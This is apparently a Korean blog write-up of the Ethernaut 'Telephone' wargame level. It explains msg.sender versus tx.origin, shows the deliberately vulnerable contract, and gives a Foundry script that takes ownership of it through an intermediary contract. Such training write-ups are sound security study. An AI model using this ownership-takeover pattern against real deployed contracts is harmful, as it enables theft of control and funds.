# The Ethernaut : Telephone

> [Blog 원문](https://velog.io/@sane100400/The-Ethernaut-Telephone)

## 핵심 개념

### `msg.sender`

컨트랙트를 호출한 사용자 또는 컨트랙트의 계정 주소를 담고 있다.

### `tx.origin`

트랜잭션을 보낸 계정의 주소를 담고 있다.

`msg.sender`와 달리 `tx.origin`은 하나의 트랜잭션 내에서 변하지 않는다. 트랜잭션을 보내는 계정은 반드시 EOA(Externally Owned Account)이므로, `tx.origin`은 항상 사용자이며 컨트랙트가 될 수 없다.

## 문제 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

## 풀이

1. `changeOwner` 호출 시 `tx.origin`과 `msg.sender`가 달라야 한다
2. 외부 컨트랙트를 통해 호출하면 `msg.sender`가 호출 컨트랙트 주소로 변경된다
   - `tx.origin` = 트랜잭션을 시작한 원래 EOA
   - `msg.sender` = 호출 컨트랙트 주소 → 조건 충족
3. 새 컨트랙트를 만들어 `changeOwner`를 호출하면 해결

## PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Counter} from "../src/Counter.sol";
import {Telephone} from "../src/Telephone.sol";

contract Take {
    constructor(Telephone telephone, address addr) {
        telephone.changeOwner(addr);
    }
}

contract PoC is Script {
    Counter public counter;
    address public target = 0x0980cE61703Ef7Cd29a30A600AA8872A997102e0;
    uint256 pk = vm.envUint("PRIV_KEY");

    function run() public {
        vm.startBroadcast(pk);

        new Take(Telephone(target), vm.addr(pk));

        vm.stopBroadcast();
    }
}
```
